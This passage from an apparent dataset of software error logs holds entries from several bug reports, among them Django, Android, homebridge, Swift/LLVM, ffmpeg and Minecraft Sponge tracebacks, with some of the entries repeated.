        "logs": "    sub = rospy.Subscriber('/camera/infra1/image_rect_raw', msg_Image, image_callback, queue_size=1)\r\n\r\n    def image_callback(self, image_msg):\r\n        system_time = time.time()\r\n        try:\r\n            image = self.bridge.imgmsg_to_cv2(image_msg, desired_encoding=\"passthrough\")\r\n        except CvBridgeError as e:\r\n            print(e)\r\n        print image.shape"
    },
    {
        "logs": "__main__.MissingFieldError: Could not find TIM12:CNT.CNT\r\nMakefile:38: recipe for target 'svd/stm32h743.svd.patched' failed"
    },
    {
        "logs": "[11/18/2020, 11:56:23] [Nursery] Error: Unsupported state or unable to authenticate data\r\n    at Decipheriv.final (internal/crypto/cipher.js:172:29)\r\n    at Parser.decryptPayload (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:191:14)\r\n    at Parser.parse (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:59:12)\r\n    at Scanner.parseServiceData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:171:52)\r\n    at Scanner.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:92:25)\r\n    at Noble.emit (events.js:322:22)\r\n    at Noble.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/noble.js:196:10)\r\n    at NobleBindings.emit (events.js:310:20)\r\n    at NobleBindings.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/bindings.js:169:10)\r\n    at Gap.emit (events.js:310:20)\r\n    at Gap.onHciLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/gap.js:244:10)\r\n    at Hci.emit (events.js:310:20)\r\n    at Hci.processLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:656:12)\r\n    at Hci.processLeMetaEvent (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:612:10)\r\n    at Hci.onSocketData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:483:12)\r\n    at BluetoothHciSocket.emit (events.js:310:20)"
    },
    {
        "logs": "[11/18/2020, 11:56:23] [Nursery] Error: Unsupported state or unable to authenticate data\r\n    at Decipheriv.final (internal/crypto/cipher.js:172:29)\r\n    at Parser.decryptPayload (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:191:14)\r\n    at Parser.parse (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:59:12)\r\n    at Scanner.parseServiceData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:171:52)\r\n    at Scanner.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:92:25)\r\n    at Noble.emit (events.js:322:22)\r\n    at Noble.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/noble.js:196:10)\r\n    at NobleBindings.emit (events.js:310:20)\r\n    at NobleBindings.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/bindings.js:169:10)\r\n    at Gap.emit (events.js:310:20)\r\n    at Gap.onHciLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/gap.js:244:10)\r\n    at Hci.emit (events.js:310:20)\r\n    at Hci.processLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:656:12)\r\n    at Hci.processLeMetaEvent (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:612:10)\r\n    at Hci.onSocketData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:483:12)\r\n    at BluetoothHciSocket.emit (events.js:310:20)"
    },
    {
        "logs": "    for _ in range(10):\r\n        try:\r\n            translator = Translator()\r\n            result = translator.translate(\r\n                text=text,\r\n                src=src,\r\n                dest=dest\r\n            )\r\n            if text != result.text:\r\n                return result.text\r\n        except Exception:\r\n            pass"
    },
    {
        "logs": "isInt<32>(RealOffset)' failed\nusername_0: This used to be https://bugs.swift.org/browse/TF-747, but I'm moving the issue here and adding more details.\r\n\r\nIt's flaky and hard to reproduce, but here are the kinds of things you need to try:\r\n* Run all the cells in a notebook that uses Python interop and TensorFlow (e.g. https://www.tensorflow.org/swift/tutorials/python_interoperability).\r\n* It seems to trigger more often if you run the cells immediately in sequence, so use a tool that does that. (https://papermill.readthedocs.io/en/latest/)\r\n* Maybe it triggers more often on machines with lots of memory.\r\n\r\nIf you trigger it, the kernel will crash and this will print out on the terminal:"
    },
    {
        "logs": "/swift-base/llvm-project/llvm/lib/ExecutionEngine/RuntimeDyld/RuntimeDyldELF.cpp:307: void llvm::RuntimeDyldELF::resolveX86_64Relocation(const llvm::SectionEntry &, uint64_t, uint64_t, uint32_t, int64_t, uint64_t): Assertion `isInt<32>(RealOffset)' failed."
    },
    {
        "logs": "Incorrect image size! 374 vs. 5992721\r\nav_interleaved_write_frame(): Broken pipe\r\nframe=    1 fps=0.0 q=0.0 Lsize=    5852kB time=00:00:00.04 bitrate=1198544.2kbits/s\r\nvideo:5852kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%\r\nConversion failed!"
    },
    {
        "logs": "Incorrect image size! 374 vs. 5992721\r\nav_interleaved_write_frame(): Broken pipe\r\nframe=    1 fps=0.0 q=0.0 Lsize=    5852kB time=00:00:00.04 bitrate=1198544.2kbits/s\r\nvideo:5852kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%\r\nConversion failed!"
    },
    {
        "logs": "Traceback:\r\nFile \"/PATH/src/django/django/core/handlers/base.py\" in get_response\r\n  163.                 response = response.render()\r\nFile \"/PATH/src/django/django/template/response.py\" in render\r\n  156.             self.content = self.rendered_content\r\nFile \"/PATH/src/django/django/template/response.py\" in rendered_content\r\n  133.         content = template.render(context, self._request)\r\nFile \"/PATH/src/django/django/template/backends/django.py\" in render\r\n  83.         return self.template.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/src/django/django/template/loader_tags.py\" in render\r\n  151.                 return template.render(context.new(values))\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in render\r\n  109.             'formulation': resolve_blocks(tmpl_name, safe_context),\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in resolve_blocks\r\n  34.         for block in template.nodelist.get_nodes_by_type(BlockNode)\r\n\r\nException Type: AttributeError at /\r\nException Value: 'Template' object has no attribute 'nodelist'"
    },
    {
        "logs": "Traceback:\r\nFile \"/PATH/src/django/django/core/handlers/base.py\" in get_response\r\n  163.                 response = response.render()\r\nFile \"/PATH/src/django/django/template/response.py\" in render\r\n  156.             self.content = self.rendered_content\r\nFile \"/PATH/src/django/django/template/response.py\" in rendered_content\r\n  133.         content = template.render(context, self._request)\r\nFile \"/PATH/src/django/django/template/backends/django.py\" in render\r\n  83.         return self.template.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/src/django/django/template/loader_tags.py\" in render\r\n  151.                 return template.render(context.new(values))\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in render\r\n  109.             'formulation': resolve_blocks(tmpl_name, safe_context),\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in resolve_blocks\r\n  34.         for block in template.nodelist.get_nodes_by_type(BlockNode)\r\n\r\nException Type: AttributeError at /\r\nException Value: 'Template' object has no attribute 'nodelist'"
    },
    {
        "logs": "shell\r\nChanged current directory to /home/username_0/.composer\r\nReading ./composer.json\r\nLoading config file ./composer.json\r\nExecuting command (CWD): git describe --exact-match --tags"
    },
    {
        "logs": "Heute, 13:04 in der App-Version 6\r\nLGE L90 (w7ds), 1024MB RAM, Android 5.0\r\nBericht 1 von 4\r\njava.lang.RuntimeException: \r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2331)\r\n \r\n  at android.app.ActivityThread.handleLaunchActivity (ActivityThread.java:2391)\r\n \r\n  at android.app.ActivityThread.access$800 (ActivityThread.java:151)\r\n \r\n  at android.app.ActivityThread$H.handleMessage (ActivityThread.java:1309)\r\n \r\n  at android.os.Handler.dispatchMessage (Handler.java:102)\r\n \r\n  at android.os.Looper.loop (Looper.java:135)\r\n \r\n  at android.app.ActivityThread.main (ActivityThread.java:5349)\r\n \r\n  at java.lang.reflect.Method.invoke (Native Method)\r\n \r\n  at java.lang.reflect.Method.invoke (Method.java:372)\r\n \r\n  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run (ZygoteInit.java:908)\r\n \r\n  at com.android.internal.os.ZygoteInit.main (ZygoteInit.java:703)\r\nCaused by: java.lang.IllegalArgumentException: \r\n \r\n  at java.io.File.checkURI (File.java:220)\r\n \r\n  at java.io.File.<init> (File.java:177)\r\n \r\n  at net.username_0.markor.model.MarkorSingleton.getFileFromUri (MarkorSingleton.java:158)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.readFileUriFromIntent (NoteActivity.java:168)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.openFromEditAction (NoteActivity.java:152)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.onCreate (NoteActivity.java:113)\r\n \r\n  at android.app.Activity.performCreate (Activity.java:6020)\r\n \r\n  at android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1105)\r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2284)"
    },
    {
        "logs": "Heute, 13:04 in der App-Version 6\r\nLGE L90 (w7ds), 1024MB RAM, Android 5.0\r\nBericht 1 von 4\r\njava.lang.RuntimeException: \r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2331)\r\n \r\n  at android.app.ActivityThread.handleLaunchActivity (ActivityThread.java:2391)\r\n \r\n  at android.app.ActivityThread.access$800 (ActivityThread.java:151)\r\n \r\n  at android.app.ActivityThread$H.handleMessage (ActivityThread.java:1309)\r\n \r\n  at android.os.Handler.dispatchMessage (Handler.java:102)\r\n \r\n  at android.os.Looper.loop (Looper.java:135)\r\n \r\n  at android.app.ActivityThread.main (ActivityThread.java:5349)\r\n \r\n  at java.lang.reflect.Method.invoke (Native Method)\r\n \r\n  at java.lang.reflect.Method.invoke (Method.java:372)\r\n \r\n  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run (ZygoteInit.java:908)\r\n \r\n  at com.android.internal.os.ZygoteInit.main (ZygoteInit.java:703)\r\nCaused by: java.lang.IllegalArgumentException: \r\n \r\n  at java.io.File.checkURI (File.java:220)\r\n \r\n  at java.io.File.<init> (File.java:177)\r\n \r\n  at net.username_0.markor.model.MarkorSingleton.getFileFromUri (MarkorSingleton.java:158)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.readFileUriFromIntent (NoteActivity.java:168)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.openFromEditAction (NoteActivity.java:152)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.onCreate (NoteActivity.java:113)\r\n \r\n  at android.app.Activity.performCreate (Activity.java:6020)\r\n \r\n  at android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1105)\r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2284)"
    },
    {
        "logs": " value: Error(PrimaryScreenInfoError(147), State { next_error: None, backtrace: None })', /checkout/src/libcore/result.rs:906:4\r\nnote: Run with "
    },
    {
        "logs": "thread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Error(PrimaryScreenInfoError(147), State { next_error: None, backtrace: None })', /checkout/src/libcore/result.rs:906:4\r\nnote: Run with `RUST_BACKTRACE=1` for a backtrace."
    },
    {
        "logs": "--------------------------------------------------------------------------------\r\nERROR: coercing to Unicode: need string or buffer, list found\r\n--------------------------------------------------------------------------------\r\n\r\n********************************************************************************\r\n2017-Oct-16 09:01pm\r\nExecuting: \"make -j4 2>&1 | tee -a /Users/name/Downloads/armory_0.96.3-src/osxbuild/build-app.log.txt\"\r\nExecuting from: \"[]\"\r\n\r\n--------------------------------------------------------------------------------\r\nERROR: coercing to Unicode: need string or buffer, list found\r\n--------------------------------------------------------------------------------\r\n\r\nTraceback (most recent call last):\r\n  File \"build-app.py\", line 741, in <module>\r\n    main()\r\n  File \"build-app.py\", line 135, in main\r\n    compile_libpng()\r\n  File \"build-app.py\", line 466, in compile_libpng\r\n    src = path.join(pngDir, '.libs', dylib)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/posixpath.py\", line 70, in join\r\n    elif path == '' or path.endswith('/'):\r\nAttributeError: 'list' object has no attribute 'endswith'"
    },
    {
        "logs": " OkHttpClient.Builder builder = new OkHttpClient().newBuilder()\r\n                .connectTimeout(120, TimeUnit.SECONDS)\r\n                .writeTimeout(120, TimeUnit.SECONDS)\r\n                .readTimeout(120, TimeUnit.SECONDS)\r\n                .cache(cache)\r\n                .retryOnConnectionFailure(true)\r\n                .addInterceptor(new com.snakydesign.watchtower.interceptor.WatchTowerInterceptor());"
    },
    {
        "logs": " OkHttpClient.Builder builder = new OkHttpClient().newBuilder()\r\n                .connectTimeout(120, TimeUnit.SECONDS)\r\n                .writeTimeout(120, TimeUnit.SECONDS)\r\n                .readTimeout(120, TimeUnit.SECONDS)\r\n                .cache(cache)\r\n                .retryOnConnectionFailure(true)\r\n                .addInterceptor(new com.snakydesign.watchtower.interceptor.WatchTowerInterceptor());"
    },
    {
        "logs": "[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                              Exception while trying to apply transaction                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* BlockTransactions failing to process can lead to unintended                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* consequences. If the exception is *directly* coming from                                                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Sponge's code, please report to Sponge.                                                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  BlockStates                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  MarkedRemoved                                                                                                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Affected Tiles                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedTiles                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedRemovals                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* NeighborNotification                                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Source Pos : soulshardsrespawn:soul_cage[active=false,powered=true], BlockPos{x=-10435, y=51, z=-1245}                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Notification : forgemultipartcbe:multipart_block, BlockPos{x=-10435, y=51, z=-1246}                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Exception:                                                                                                                            */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* net.minecraft.util.ReportedException: Exception while updating neighbours                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:727)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* java.lang.NullPointerException: null                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:691)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/"
    },
    {
        "logs": "[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                              Exception while trying to apply transaction                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* BlockTransactions failing to process can lead to unintended                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* consequences. If the exception is *directly* coming from                                                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Sponge's code, please report to Sponge.                                                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  BlockStates                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  MarkedRemoved                                                                                                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Affected Tiles                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedTiles                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedRemovals                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* NeighborNotification                                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Source Pos : soulshardsrespawn:soul_cage[active=false,powered=true], BlockPos{x=-10435, y=51, z=-1245}                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Notification : forgemultipartcbe:multipart_block, BlockPos{x=-10435, y=51, z=-1246}                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Exception:                                                                                                                            */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* net.minecraft.util.ReportedException: Exception while updating neighbours                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:727)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       